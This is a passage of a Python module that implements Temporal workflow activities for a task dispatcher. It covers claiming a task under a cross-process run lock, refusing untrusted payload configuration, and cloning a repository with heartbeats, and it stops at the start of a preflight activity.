"""Activity implementations for the factory dispatcher workflow."""

from __future__ import annotations

import asyncio
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FutureTimeout
import fcntl
import logging
import os
import tempfile
import time
from pathlib import Path
from types import SimpleNamespace
from typing import Any, NamedTuple, NoReturn

from temporalio import activity
from temporalio.client import Client, ScheduleState, ScheduleUpdate
from temporalio.exceptions import ApplicationError

import dispatch
import doctrine
import guards
import queue_order
import retry_policy
import schedule_runtime
from workflow_core import DISPATCH_HEARTBEAT_INTERVAL
from config import config
from substrate import default_store

_LOG = logging.getLogger("factory-dispatcher.dispatch-steps")


# The cross-process "at most one dispatch run at a time" mechanism. Deliberately
# independent of worker.py's ACTIVITY_EXECUTOR_CONCURRENCY: that constant bounds
# how many activity slots this Temporal Worker offers, and cannot see
# dispatch.py's `--once` CLI path at all -- a plain Python process with no
# Temporal client, workflow, or activity context, that calls claim_activity and
# cleanup_activity directly via ACTIVITY_FUNCTIONS (dispatch.dispatch_once ->
# workflow_core.run_dispatch_attempt). A manually run `--once` racing the
# Temporal-scheduled drain is exactly the gap ScheduleOverlapPolicy.SKIP cannot
# cover (SKIP only dedupes overlapping *scheduled* actions) and the race
# FA-S26 named when it sized the executor pool to 1. flock is the same idiom
# tunnel_keeper.acquire_single_instance_lock already uses for a two-processes-
# fighting-over-one-resource problem: it releases automatically if its holder
# dies, so a killed worker or a killed --once run never wedges a later attempt.
DISPATCH_RUN_LOCK_PATH_ENV = "FACTORY_DISPATCH_RUN_LOCK_PATH"

_dispatch_run_lock_handle: Any = None


class DispatchRunLockResult(NamedTuple):
    """Whether the run lock was taken, and who held it when it was not.

    The holder matters because a lock released on every in-band path can still
    be left held by an out-of-band one -- an operator `temporal workflow
    terminate`, or a lost workflow -- and the worker process survives both, so
    flock's release-on-death story does not cover them. Without the holder,
    that wedge presents as `dispatch_in_flight` with exit_code 0 and nothing
    named: a stall that reports success, which is the failure class CLAUDE.md
    exists to prevent. tunnel_keeper.acquire_single_instance_lock -- the idiom
    this lock already copies -- reads the pid back for exactly this reason.

    `__bool__` defers to `acquired` so callers can keep treating the result as
    the plain "did I get it" boolean it replaced.
    """

    acquired: bool
    holder: str | None = None

    def __bool__(self) -> bool:
        return self.acquired


def _dispatch_run_lock_path() -> Path:
    return Path(
        os.environ.get(
            DISPATCH_RUN_LOCK_PATH_ENV,
            str(Path.home() / ".factory-dispatcher" / "dispatch-run.lock"),
        )
    )


def _acquire_dispatch_run_lock() -> DispatchRunLockResult:
    """Take the run lock; never blocks. `.acquired` is False if another holds it,
    and `.holder` then names the pid that does.

    Called once, at the very start of claim_activity, before any bead is
    touched. The caller must release it (_release_dispatch_run_lock) on every
    path that does not end in a successful "claimed" result -- cleanup_activity
    is the release point for the one path that does, since it is the only step
    workflow_core.run_dispatch_attempt guarantees runs after a successful claim.
    """
    global _dispatch_run_lock_handle
    path = _dispatch_run_lock_path()
    path.parent.mkdir(parents=True, exist_ok=True)
    handle = path.open("a+")
    try:
        fcntl.flock(handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
    except OSError:
        handle.seek(0)
        holder = handle.read().strip() or "unknown"
        handle.close()
        return DispatchRunLockResult(False, holder)
    handle.seek(0)
    handle.truncate()
    handle.write(str(os.getpid()))
    handle.flush()
    _dispatch_run_lock_handle = handle
    return DispatchRunLockResult(True, str(os.getpid()))


def _release_dispatch_run_lock() -> None:
    global _dispatch_run_lock_handle
    handle = _dispatch_run_lock_handle
    if handle is None:
        return
    _dispatch_run_lock_handle = None
    try:
        fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
    finally:
        handle.close()


TEMPORAL_PAUSE_TYPES = SimpleNamespace(
    ScheduleState=ScheduleState,
    ScheduleUpdate=ScheduleUpdate,
)


def _cfg_from_state(state: dict[str, Any]) -> dispatch.Config:
    cfg = state["cfg"]
    workdir_root = cfg.get("workdir_root")
    return dispatch.Config(
        repo=str(cfg["repo"]),
        remote=str(cfg["remote"]),
        base_ref=str(cfg["base_ref"]),
        repo_root=Path(cfg["repo_root"]),
        workdir_root=Path(workdir_root) if workdir_root is not None else None,
    )


def _cfg_to_state(cfg: dispatch.Config) -> dict[str, str | None]:
    return {
        "repo": cfg.repo,
        "remote": cfg.remote,
        "base_ref": cfg.base_ref,
        "repo_root": str(cfg.repo_root),
        "workdir_root": str(cfg.workdir_root) if cfg.workdir_root is not None else None,
    }


_CFG_FIELDS = ("repo", "remote", "base_ref", "repo_root")


def _differing_cfg_fields(
    payload_cfg: dispatch.Config, trusted: dispatch.Config
) -> tuple[str, ...]:
    return tuple(name for name in _CFG_FIELDS if getattr(payload_cfg, name) != getattr(trusted, name))


def _refuse_untrusted_cfg(step: str, *, differing_fields: tuple[str, ...] = ()) -> NoReturn:
    """Log, then raise, the one refusal ``_resolve_cfg`` ever raises.

    Nothing logged or raised here is taken from the payload except field
    NAMES the caller already knows are among repo/remote/base_ref/repo_root
    -- never a payload VALUE -- so a hostile payload cannot use its own
    refusal to write chosen text into the log or the workflow history.
    """
    info = activity.info()
    fields_note = (
        f"; differing fields: {', '.join(differing_fields)}" if differing_fields else ""
    )
    _LOG.error(
        "refusing untrusted dispatch cfg: step=%s workflow_id=%s workflow_run_id=%s%s",
        step,
        info.workflow_id,
        info.workflow_run_id,
        fields_note,
    )
    raise ApplicationError(
        f"dispatch step '{step}' refused a Config carried in its Temporal payload: "
        "the Temporal frontend accepts unauthenticated clients (dev.finding "
        "dd648709), so this step's Config comes only from the worker's own "
        "environment, never from the request it was started or resumed with.",
        type="UntrustedDispatchConfig",
        non_retryable=True,
    )


def _resolve_cfg(payload: dict[str, Any], *, step: str) -> dispatch.Config:
    """Resolve the Config ``step`` uses, refusing one an untrusted Temporal
    payload chose.

    ``activity.in_activity()`` decides which caller this is, the same SDK
    context check ``_default_heartbeat`` and ``_current_workflow_run_identity``
    already depend on reading ``True`` under a real Temporal worker.

    Outside a Temporal activity context -- ``dispatch.dispatch_once``'s
    in-process executor (``asyncio.to_thread``, no worker, no activity
    context) and every direct-call unit test in this suite -- the caller
    passed ``cfg`` as a plain value inside its own Python process; there is
    no Temporal frontend between it and this code, so there is nothing to
    distrust, and behaviour is exactly what it was before this function
    existed: for ``claim``, a payload ``"cfg"`` is honored when present, else
    ``dispatch.Config.from_env()``; for the five later steps,
    ``_cfg_from_state(payload)`` always.

    Inside a context, the payload was written by whoever could reach the
    Temporal frontend -- which accepts unauthenticated clients (dev.finding
    dd648709) -- so the only Config trusted here is
    ``dispatch.Config.from_env()``, read fresh from the worker's own
    environment. ``claim`` refuses ANY ``"cfg"`` key outright, whatever its
    value: ``schedule_runtime.py`` starts ``DispatchTaskWorkflow`` with
    ``{}``, so no legitimate start ever carries one. The five later steps
    expect the state ``claim`` itself built, which always carries a ``cfg``:
    absent, or malformed (anything ``_cfg_from_state`` raises on), is
    refused; present and equal to the trusted value (``Config`` is a frozen
    dataclass, so ``==`` compares every field) returns the trusted object,
    never the payload's own copy; present and different is refused.

    This resolves ONLY ``cfg``. It makes no other field a Temporal payload
    carries trustworthy -- ``state["worker"]["argv"]``, the prompt, the task,
    and the clone/workdir paths still come from the payload verbatim. Those
    remain open (see this bead's AC-7); this closes exactly the one entry
    point named in its spec: a plain workflow start choosing ``cfg``.
    """
    if not activity.in_activity():
        if step == "claim":
            return _cfg_from_state(payload) if "cfg" in payload else dispatch.Config.from_env()
        return _cfg_from_state(payload)

    trusted = dispatch.Config.from_env()

    if step == "claim":
        if "cfg" in payload:
            _refuse_untrusted_cfg(step)
        return trusted

    if "cfg" not in payload:
        _refuse_untrusted_cfg(step)

    try:
        payload_cfg = _cfg_from_state(payload)
    except Exception:
        _refuse_untrusted_cfg(step)

    if payload_cfg != trusted:
        _refuse_untrusted_cfg(step, differing_fields=_differing_cfg_fields(payload_cfg, trusted))

    return trusted


def _tree_to_state(tree: dispatch.TreeState) -> dict[str, str]:
    return {"head": tree.head, "status": tree.status}


def _tree_from_state(state: dict[str, str]) -> dispatch.TreeState:
    return dispatch.TreeState(head=state["head"], status=state["status"])


# Worker output crosses an activity boundary, so it becomes a Temporal payload.
# Temporal refuses a gRPC message over 4MiB outright: on 2026-08-07 a run produced
# 4,445,196 bytes, the activity could not complete at the transport layer, and the
# task sat in `doing` forever because nothing could transition it. The whole queue
# was blocked behind one workflow that could never finish.
#
# Nothing downstream needs the full text. Every consumer truncates for a note —
# WORKER_OUTPUT_TAIL_CHARS is 400, and the verification summaries use 500 to 1000.
# The bound here is deliberately far larger than any of them so that raising a note
# limit later does not silently start losing content, while staying two orders of
# magnitude under the transport limit even with both streams at full size.
WORKER_STREAM_STATE_LIMIT = 64_000
_TRUNCATION_MARKER = "\n[... truncated by the dispatcher: kept the last {kept} of {total} characters ...]"


def _bounded_stream(value: str, limit: int = WORKER_STREAM_STATE_LIMIT) -> str:
    """Keep the tail of a worker stream, which is where the failure is.

    Truncation is announced in the returned text rather than done silently: a
    reader who sees output that starts mid-sentence must be able to tell that the
    dispatcher cut it, not the worker.
    """
    if len(value) <= limit:
        return value
    return _TRUNCATION_MARKER.format(kept=limit, total=len(value)) + value[-limit:]


def _worker_result_to_state(result: dispatch.WorkerResult) -> dict[str, Any]:
    state = {
        "exit_code": result.exit_code,
        "stdout": _bounded_stream(result.stdout),
        "duration_s": result.duration_s,
        "timed_out": result.timed_out,
    }
    if result.stderr is not None:
        state["stderr"] = _bounded_stream(result.stderr)
    # cost_usd/tokens are omitted, not zeroed, when the worker reported
    # neither — propose_activity/record_failure_activity read their absence
    # back as "unmeasured" through _worker_result_from_state below, the same
    # distinction dispatch.provenance_for_task makes for its None default.
    if result.cost_usd is not None:
        state["cost_usd"] = result.cost_usd
    if result.tokens is not None:
        state["tokens"] = result.tokens
    return state


def _worker_result_from_state(state: dict[str, Any]) -> dispatch.WorkerResult:
    return dispatch.WorkerResult(
        exit_code=int(state["exit_code"]),
        stdout=str(state.get("stdout") or ""),
        duration_s=float(state.get("duration_s") or 0.0),
        timed_out=bool(state.get("timed_out")),
        stderr=str(state.get("stderr") or "") if "stderr" in state else None,
        cost_usd=float(state["cost_usd"]) if "cost_usd" in state else None,
        tokens=int(state["tokens"]) if "tokens" in state else None,
    )


WorkerRunner = Callable[
    [str, Path, int, tuple[Any, ...]],
    dispatch.WorkerResult,
]
Heartbeat = Callable[[dict[str, Any]], None]


def _worker_heartbeat_details(state: dict[str, Any]) -> dict[str, Any]:
    task = state.get("task") or {}
    worker = state.get("worker") or {}
    return {
        "step": "run",
        "task_id": task.get("id"),
        "worker": worker.get("name"),
        "budget_minutes": state.get("budget"),
    }


def _activity_heartbeat_details(step: str, state: dict[str, Any]) -> dict[str, Any]:
    task = state.get("task") or {}
    return {"step": step, "task_id": task.get("id")}


def _default_heartbeat(details: dict[str, Any]) -> None:
    """The real Temporal heartbeat, made safe to call with no worker running.

    Every activity in this module is unit-tested by calling the
    ``@activity.defn`` function directly, with no Temporal worker and
    therefore no live activity context -- the shape production never hits,
    since the worker always establishes one before invoking the function.
    ``activity.in_activity()`` is the SDK's own supported check for exactly
    this, so a real heartbeat is sent when one exists and this is a silent
    no-op otherwise, rather than every direct-call test needing to know
    heartbeating happens at all.
    """
    if activity.in_activity():
        activity.heartbeat(details)


def _run_blocking_with_heartbeat(
    fn: Callable[[], Any],
    *,
    heartbeat: Heartbeat = _default_heartbeat,
    heartbeat_interval: float = DISPATCH_HEARTBEAT_INTERVAL.total_seconds(),
    details: dict[str, Any] | None = None,
) -> Any:
    """Run a blocking call on a worker thread while keeping Temporal liveness fresh.

    The pattern proven for the worker subprocess below, generalized to any
    other blocking call an activity makes that can run longer than a few
    seconds: git clone, venv bootstrap, declared verification commands,
    opening the PR. A dead connection stops heartbeats immediately; it is the
    short, per-step ``heartbeat_timeout`` declared in the workflow
    (workflow_core.heartbeat_timeout_for_step) that turns that into a fast
    failure instead of a 45-minute silence.
    """
    if heartbeat_interval <= 0:
        raise ValueError("heartbeat_interval must be positive")

    payload = details or {}
    with ThreadPoolExecutor(
        max_workers=1,
        thread_name_prefix="factory-dispatcher-blocking",
    ) as executor:
        future = executor.submit(fn)
        while True:
            heartbeat(payload)
            try:
                return future.result(timeout=heartbeat_interval)
            except FutureTimeout:
                continue


def _run_worker_with_heartbeat(
    state: dict[str, Any],
    *,
    run_worker: WorkerRunner | None = None,
    prepare_argv: Callable[..., tuple[str, ...]] | None = None,
    heartbeat: Heartbeat = _default_heartbeat,
    heartbeat_interval: float = DISPATCH_HEARTBEAT_INTERVAL.total_seconds(),
) -> dispatch.WorkerResult:
    """Run the blocking worker subprocess while keeping Temporal liveness fresh.

    ``prepare_argv`` defaults to ``dispatch.prepare_worker_argv``, resolved at
    call time so a test or a split-mode caller (design §7 row E6) can swap it
    without this function changing: with the keyword unset, behaviour is
    byte-identical to before this parameter existed.
    """
    run_worker = run_worker or dispatch.run_worker
    prompt = str(state["prompt"])
    clone = Path(state["clone"])
    budget = int(state["budget"])
    principle_pairs = tuple(
        tuple(pair) for pair in (state.get("principle_pairs") or ())
    )
    argv = (prepare_argv or dispatch.prepare_worker_argv)(
        tuple(state["worker"]["argv"]),
        clone,
        (state.get("task") or {}).get("content") or {},
        bool(state["worker"].get("uses_personas")),
        principle_pairs,
    )
    details = _worker_heartbeat_details(state)

    def _lift_design_note(result):
        # Amendment 30 PR-7: the architect persona's judgment lands ON the
        # bead, or the persona split is role-play. Best-effort in both
        # directions (dev.task 20025031): the note carries the provenance
        # record the substrate requires of agent-authored beads — the bare
        # call 422'd on its first live write and paused the factory — and a
        # rejected write is a LOST comment, never a failed run. A missing
        # file means the predicate did not fire or the worker had nothing
        # to record.
        design = clone / ".factory" / "design.md"
        if result.exit_code == 0 and design.is_file():
            body = design.read_text().strip()
            if body:
                task_id = str((state.get("task") or {}).get("id"))
                worker_name = str(
                    (state.get("worker") or {}).get("name") or dispatch.DEFAULT_WORKER
                )
                try:
                    default_store().add_note(
                        task_id,
                        "comment",
                        "Architect/SME design judgment (Amendment 30):\n\n" + body,
                        dispatch.CREATED_BY,
                        provenance=dispatch.provenance_for_task(
                            task_id, worker_name, result.duration_s,
                            tokens=result.tokens, cost_usd=result.cost_usd,
                        ),
                    )
                except Exception as exc:  # noqa: BLE001 — any rejection is a
                    # lost comment, not a failed run; the worker's diff and
                    # status note are the record that must survive.
                    _LOG.warning(
                        "design note for %s was rejected by the substrate and "
                        "is lost from the bead: %s; first line: %s",
                        task_id,
                        exc,
                        body.splitlines()[0][:120],
                    )

    outcome = _run_blocking_with_heartbeat(
        lambda: run_worker(
            prompt,
            clone,
            budget,
            argv,
            tuple(state["worker"].get("containment_allow") or ()),
            tuple(
                (str(k), str(v))
                for k, v in (state["worker"].get("extra_env") or ())
            ),
            bool(state["worker"].get("grade_json_result")),
        ),
        heartbeat=heartbeat,
        heartbeat_interval=heartbeat_interval,
        details=details,
    )
    if outcome.cost_usd:
        dispatch.record_spend_usd(outcome.cost_usd)
    if bool(state["worker"].get("uses_personas")):
        _lift_design_note(outcome)
    return outcome


def _scope_to_state(verdict: guards.ScopeVerdict) -> dict[str, Any]:
    return {
        "out_of_scope": list(verdict.out_of_scope),
        "forbidden": list(verdict.forbidden),
        "unsupported_patterns": list(verdict.unsupported_patterns),
        "description": verdict.describe(),
    }


def _scope_from_state(state: dict[str, Any]) -> guards.ScopeVerdict:
    return guards.ScopeVerdict(
        out_of_scope=tuple(state.get("out_of_scope") or ()),
        forbidden=tuple(state.get("forbidden") or ()),
        unsupported_patterns=tuple(state.get("unsupported_patterns") or ()),
    )


def _verification_to_state(report: dispatch.VerificationReport) -> dict[str, Any]:
    return {
        "bootstrap_note": report.bootstrap_note,
        "commands": [
            {
                "command": result.command,
                "outcome": result.outcome,
                "exit_code": result.exit_code,
                "output": result.output,
                "duration_s": result.duration_s,
                "reason": result.reason,
            }
            for result in report.commands
        ],
        "description": report.describe(),
    }


def _verification_from_state(state: dict[str, Any]) -> dispatch.VerificationReport:
    return dispatch.VerificationReport(
        tuple(
            dispatch.VerificationCommandResult(
                command=str(result["command"]),
                outcome=str(result["outcome"]),
                exit_code=result.get("exit_code"),
                output=str(result.get("output") or ""),
                duration_s=float(result.get("duration_s") or 0.0),
                reason=str(result.get("reason") or ""),
            )
            for result in state.get("commands", [])
        ),
        bootstrap_note=str(state.get("bootstrap_note") or ""),
    )


def _expects_pristine_failure(task: dict[str, Any]) -> bool:
    verification = (task.get("content") or {}).get("verification") or {}
    return bool(verification.get("expect_pristine_failure"))


@activity.defn(name="claim")
def claim_activity(request: dict[str, Any]) -> dict[str, Any]:
    """Resolve cfg first -- a refused request takes no lock, reads no bead,
    and changes nothing (AC-2 of the dd648709-narrowing bead) -- then take
    the dispatch run lock, then claim, releasing it on every path except a
    successful claim, which hands the lock off to cleanup_activity (see
    _acquire_dispatch_run_lock's docstring for why the split)."""
    cfg = _resolve_cfg(request, step="claim")
    lock = _acquire_dispatch_run_lock()
    if not lock:
        return {
            "status": "dispatch_in_flight",
            "exit_code": 0,
            "holder": lock.holder,
            "message": (
                f"Another dispatch run (pid {lock.holder}) already holds the "
                "run lock; refusing to claim a task concurrently. This clears "
                "on its own once that run finishes. If that pid is not alive, "
                "the lock was left held by an out-of-band end (an operator "
                "`temporal workflow terminate`, or a lost workflow) that the "
                "in-band release paths do not cover; restarting the worker "
                "frees it."
            ),
        }
    try:
        result = _claim_task(request, cfg)
    except Exception:
        _release_dispatch_run_lock()
        raise
    if result.get("status") != "claimed":
        _release_dispatch_run_lock()
    return result


def _claim_task(request: dict[str, Any], cfg: dispatch.Config) -> dict[str, Any]:
    floor = dispatch.budget_floor_reason()
    if floor:
        return {"status": "budget_floor", "exit_code": 0, "message": floor}
    sub = default_store()
    task_id = request.get("task_id")
    dry_run = bool(request.get("dry_run"))

    # Fetched once and threaded through pick_task and is_runnable below —
    # mirrors dispatch_once's old placement exactly: an explicit task_id
    # (an operator-forced dispatch) still needs the superseded/ordering
    # guard guards.is_runnable derives from the full population, the same
    # guard pick_task's own auto-scan already applies when no task_id is
    # given.
    tasks = sub.list_tasks()
    task = dispatch.pick_task(sub, str(task_id) if task_id else None, tasks)
    if task is None:
        return {"status": "no_task", "exit_code": 0, "message": "No runnable pending task."}

    notes = sub.list_notes(task["id"])
    # release_by_task_id=None matches guards.is_runnable's own prior default
    # here -- unchanged from before this bead (AC-2: "the same inputs").
    # apply_breaker is False only on the explicit --task path: that is the
    # one operator-force escape hatch from the environmental-fault breaker.
    verdict = queue_order.selectable_verdict(
        task, notes, tasks, release_by_task_id=None, apply_breaker=not bool(task_id)
    )
    if not verdict.selectable:
        return {
            "status": "not_runnable",
            "exit_code": 1,
            "message": f"Not runnable: {verdict.hold_reasons[0]}",
            "task_id": task["id"],
        }

    try:
        worker = dispatch.select_worker(task)
    except dispatch.DispatchError as exc:
        return {
            "status": "not_runnable",
            "exit_code": 1,
            "message": f"Not runnable: {exc}",
            "task_id": task["id"],
        }

    content = task.get("content") or {}

    # Resolved here, before the claim transition — mirrors dispatch_once's placement
    # (dispatch.py:4181-4188) exactly: a lane with mapped principles must not dispatch
    # with silently-absent doctrine (F-DCE-3), and this runs against the host checkout
    # (cfg.repo_root), before the clone exists. Failing here, ahead of pending->doing,
    # means no retry attempt is ever spent on a doctrine outage — the same shape as the
    # disk_floor/budget_floor/not_runnable refusals below.
    try:
        citations = doctrine.load_citations_for_lane(
            cfg.repo_root, content.get("lane") or ""
        )
    except doctrine.PrinciplesParseError as exc:
        return {
            "status": "environmental_fault",
            "exit_code": 1,
            "message": f"Cannot dispatch: {exc}",
            "task_id": task["id"],
        }
    principle_pairs = doctrine.as_prompt_pairs(citations)

    prompt = guards.build_prompt(task, notes, principle_pairs)
    if dry_run:
        return {
            "status": "dry_run",
            "exit_code": 0,
            "message": prompt,
            "task_id": task["id"],
        }

    budget = dispatch.effective_budget_minutes(content)

    # Reclaim what a prior scheduled run's kill (launchd restart, tunnel loss)
    # stranded, and refuse outright if the disk it would land on is already
    # too full to trust - both ahead of the claim, mirroring dispatch_once's
    # pre-claim sweep+floor check (dispatch.py) so this is no longer reachable
    # only when a human runs the CLI.
    workdir_root = cfg.workdir_root or Path(tempfile.gettempdir())
    sweep = dispatch.sweep_orphan_workdirs(workdir_root)
    # Carried on every return from here on, not just logged, so a CLI-driven
    # run can report it too, the way dispatch_once always printed it — a
    # Temporal worker's stdout is not where an operator is looking, so this
    # stays logged for that side as well.
    sweep_note = sweep.describe() if (sweep.removed or sweep.failures) else None
    if sweep_note:
        _LOG.info("orphan workdir sweep: %s", sweep_note)

    floor_reason = dispatch.disk_floor_reason(workdir_root)
    if floor_reason:
        return {
            "status": "disk_floor",
            "exit_code": 1,
            "message": f"Refusing to claim task {task['id']}: {floor_reason}",
            "task_id": task["id"],
            "sweep_note": sweep_note,
        }

    try:
        dispatch.transition_state_checked(sub, task["id"], "pending", "doing", dispatch.CREATED_BY)
    except Exception as exc:  # noqa: BLE001 - preserve current claim diagnostics
        status = dispatch.store_error_status(exc)
        if status == 404:
            message = (
                f"Cannot claim task {task['id']}: the substrate has no "
                "POST /beads/{id}/transition endpoint. The image carrying it is not "
                "deployed - merged is not deployed. Check the running substrate version "
                "before rerunning."
            )
        elif status == 409:
            message = (
                f"Lost the race for task {task['id']}: another runner claimed it first. "
                "This is the compare-and-set working as intended."
            )
        elif status == 422:
            message = (
                f"Cannot claim task {task['id']}: pending -> doing is not a legal edge for "
                f"this bead. It is probably not in `pending` any more: {exc}"
            )
        elif status is not None:
            message = f"Failed to claim task {task['id']}: {exc}"
        else:
            message = f"Failed to claim task {task['id']} (substrate unreachable): {exc}"
        return {
            "status": "claim_failed",
            "exit_code": 1,
            "message": message,
            "task_id": task["id"],
            "sweep_note": sweep_note,
        }

    if worker.fallback_note:
        # A retired worker_hint falls back to the default worker rather than
        # refusing (PRIN-008: never silently ignored) — named on the bead so
        # an operator sees which hint was retired and what ran instead.
        sub.add_note(
            task["id"],
            "status",
            worker.fallback_note,
            dispatch.CREATED_BY,
            provenance=dispatch.provenance_for_operator_action(task["id"], "worker-fallback"),
        )

    try:
        sub.add_note(
            task["id"],
            "status",
            f"{guards.CLAIM_NOTE_PREFIX}by {dispatch.CREATED_BY}. Isolating a clone, "
            f"checking pristine declared verification, and running "
            f"`{worker.command_display()}` with a {budget}m budget.",
            dispatch.CREATED_BY,
            provenance=dispatch.provenance_for_task(task["id"], worker.name),
        )
    except Exception as exc:  # noqa: BLE001 - the claim is not atomic without this
        # compensation: pending->doing already landed, and a bead left in doing
        # with no claim note is indistinguishable from live work on every view
        # the platform has (2026-08-23: one failed note write here stranded
        # three beads once Temporal retried the workflow and each retry picked
        # a fresh runnable task instead of resuming or releasing this one).
        note_error = str(exc)
        try:
            dispatch.transition_state_checked(sub, task["id"], "doing", "pending", dispatch.CREATED_BY)
        except Exception as compensation_exc:  # noqa: BLE001 - report, don't swallow
            return {
                "status": "claim_failed",
                "exit_code": 1,
                "message": (
                    f"Claimed task {task['id']} (pending->doing) but the claim note "
                    f"failed to write ({note_error}), and releasing it back to "
                    f"pending also failed ({compensation_exc}). The bead is now "
                    "stranded in doing with no claim note recorded - "
                    "--report-stuck reports this shape so it can be found without "
                    "a hand search."
                ),
                "task_id": task["id"],
                "sweep_note": sweep_note,
            }
        return {
            "status": "claim_failed",
            "exit_code": 1,
            "message": (
                f"Claimed task {task['id']} (pending->doing) but the claim note "
                f"failed to write ({note_error}); released it back to pending so "
                "a retry does not strand a different bead behind it."
            ),
            "task_id": task["id"],
            "sweep_note": sweep_note,
        }

    return {
        "status": "claimed",
        "exit_code": 0,
        "task": task,
        "notes": notes,
        "prompt": prompt,
        "principle_pairs": [list(pair) for pair in principle_pairs],
        "citation_ids": [c.id for c in citations],
        "sweep_note": sweep_note,
        "budget": budget,
        "worker": {
            "name": worker.name,
            "argv": list(worker.argv),
            "command_display": worker.command_display(),
            "containment_allow": list(worker.containment_allow),
            "extra_env": [list(pair) for pair in worker.extra_env],
            "provenance_model": worker.provenance_model,
            "grade_json_result": worker.grade_json_result,
            "uses_personas": worker.uses_personas,
        },
        "cfg": _cfg_to_state(cfg),
        "run_started": time.time(),
    }


def _make_clone_with_heartbeat(
    cfg: dispatch.Config,
    clone: Path,
    state: dict[str, Any],
    *,
    make_clone: Callable[[dispatch.Config, Path], None] | None = None,
    heartbeat: Heartbeat = _default_heartbeat,
    heartbeat_interval: float = DISPATCH_HEARTBEAT_INTERVAL.total_seconds(),
) -> None:
    """Clone + venv bootstrap can run minutes (dispatch.make_clone); heartbeat through it.

    ``make_clone`` resolves ``dispatch.make_clone`` at call time, not as a
    bound default, so a test's ``monkeypatch.setattr(dispatch, "make_clone",
    ...)`` -- the existing convention throughout this test suite -- still
    reaches it.
    """
    call = make_clone or dispatch.make_clone
    _run_blocking_with_heartbeat(
        lambda: call(cfg, clone),
        heartbeat=heartbeat,
        heartbeat_interval=heartbeat_interval,
        details=_activity_heartbeat_details("isolate", state),
    )


def _verify_declared_commands_with_heartbeat(
    clone: Path,
    commands: tuple[str, ...],
    state: dict[str, Any],
    *,
    step: str,
    verify_declared_commands: Callable[
        [Path, tuple[str, ...]], dispatch.VerificationReport
    ]
    | None = None,
    heartbeat: Heartbeat = _default_heartbeat,
    heartbeat_interval: float = DISPATCH_HEARTBEAT_INTERVAL.total_seconds(),
) -> dispatch.VerificationReport:
    """Bootstrap + declared commands can each run up to 20 minutes; heartbeat through them.

    ``verify_declared_commands`` resolves ``dispatch.verify_declared_commands``
    at call time, not as a bound default, so a test's
    ``monkeypatch.setattr(dispatch, "verify_declared_commands", ...)`` --
    the existing convention throughout this test suite -- still reaches it.
    """
    call = verify_declared_commands or dispatch.verify_declared_commands
    return _run_blocking_with_heartbeat(
        lambda: call(clone, commands),
        heartbeat=heartbeat,
        heartbeat_interval=heartbeat_interval,
        details=_activity_heartbeat_details(step, state),
    )


def _current_workflow_run_identity() -> tuple[str | None, str | None]:
    """The Temporal workflow run this activity executes under, if any (OPS-60).

    ``activity.in_activity()`` is False in this module's own direct-call unit tests --
    no Temporal worker ever established a context, mirroring ``_default_heartbeat``'s
    same guard just above -- so those tests fall back to ``mark_workdir_owner``'s
    pid+start-time identity instead of a workflow_id/run_id that was never real.

    A worker daemon process hosts every activity invocation across every run it ever
    executes, so stamping only its pid on a workdir it creates makes that workdir read
    "owner alive" forever, long after the run that created it finished. Naming the
    workflow run here is what lets ``workdir_owner_is_alive`` ask Temporal whether THIS
    run is still executing, instead of the process table whether the daemon is.
    """
    if not activity.in_activity():
        return None, None
    info = activity.info()
    return info.workflow_id, info.workflow_run_id


def _record_absent_premise_paths(task: dict[str, Any], clone: Path) -> None:
    """Grade the task's declared premise paths against the clone's own HEAD
    and, if any are missing, write an advisory note on the bead.

    ``dispatch.tracked_paths`` reads the clone the dispatcher just made --
    the exact ref the worker is about to run against, before its own turn has
    touched anything -- never ``cfg.repo_root`` or any other operator-visible
    tree (AC-1/AC-4). Everything in this function, not just the note write,
    is wrapped and swallowed: this check is advisory (AC-2), so any failure
    here -- reading the clone included -- must not turn into a failed
    dispatch attempt over a check the operator never asked to gate anything.

    Idempotent per identical finding (dev.finding F5): ``isolate_activity``
    runs once per dispatch attempt, so a bead stuck retrying the same absent
    premise path used to accrue one identical advisory note per attempt, up
    to ``DISPATCH_RETRY_MAXIMUM_ATTEMPTS``. Skipping the write when a note
    with this exact rendered body already sits on the bead means a *changed*
    finding (the worker created one of the paths, or named a new one) still
    gets its own note -- only a byte-for-byte repeat is suppressed.
    """
    try:
        content = task.get("content") or {}
        present_paths = dispatch.tracked_paths(clone)
        absent = guards.absent_premise_paths(content, present_paths)
        if not absent:
            return
        body = guards.render_absent_premise_note(absent)
        store = default_store()
        existing = store.list_notes(task["id"])
        if any(
            (note.get("content") or {}).get("kind") == "status"
            and (note.get("content") or {}).get("body") == body
            for note in existing
        ):
            return
        store.add_note(
            task["id"],
            "status",
            body,
            dispatch.CREATED_BY,
            provenance=dispatch.provenance_for_task(task["id"], dispatch.DEFAULT_WORKER),
        )
    except Exception:  # noqa: BLE001 - advisory only, never fails the dispatch
        _LOG.warning("failed to compute/record absent premise paths for %s", task.get("id"))


@activity.defn(name="isolate")
def isolate_activity(state: dict[str, Any]) -> dict[str, Any]:
    cfg = _resolve_cfg(state, step="isolate")
    workdir_root = cfg.workdir_root or Path(tempfile.gettempdir())
    workdir = Path(tempfile.mkdtemp(prefix="factory-", dir=workdir_root))
    # Written immediately after mkdtemp, before anything else can fail: a
    # sweep that finds no marker treats this workdir as ownerless (dead) even
    # though the scheduled worker holding it is still very much alive.
    workflow_id, workflow_run_id = _current_workflow_run_identity()
    dispatch.mark_workdir_owner(
        workdir, workflow_id=workflow_id, workflow_run_id=workflow_run_id
    )
    clone = workdir / "repo"
    try:
        before = dispatch.fingerprint_tree(cfg.repo_root)
        _make_clone_with_heartbeat(cfg, clone, state)
        # The revision declared verification actually runs against, resolved
        # once, right after the clone exists, before anything can change it —
        # named on the PR (open_pull_request's "Verification checkout"
        # section) so a reviewer dates the evidence against that commit
        # rather than against when the PR happened to open (OPS-42). Both
        # entry points read it back from state instead of recomputing it.
        verified_revision = dispatch.fingerprint_clone(clone).head
        # Advisory premise-path check (dev.finding 0d1e952b's AC-3 half),
        # graded right here: this is the one point in the sequence with a
        # clone (claim runs before isolate) whose tree the worker has not
        # yet touched (run happens after isolate). See guards.absent_premise_paths.
        _record_absent_premise_paths(state.get("task") or {}, clone)
    except Exception:
        dispatch.cleanup_workdir(workdir)
        raise
    return {
        **state,
        "workdir": str(workdir),
        "clone": str(clone),
        "before": _tree_to_state(before),
        "verified_revision": verified_revision,
    }


@activity.defn(name="preflight")
def preflight_activity(state: dict[str, Any]) -> dict[str, Any]:
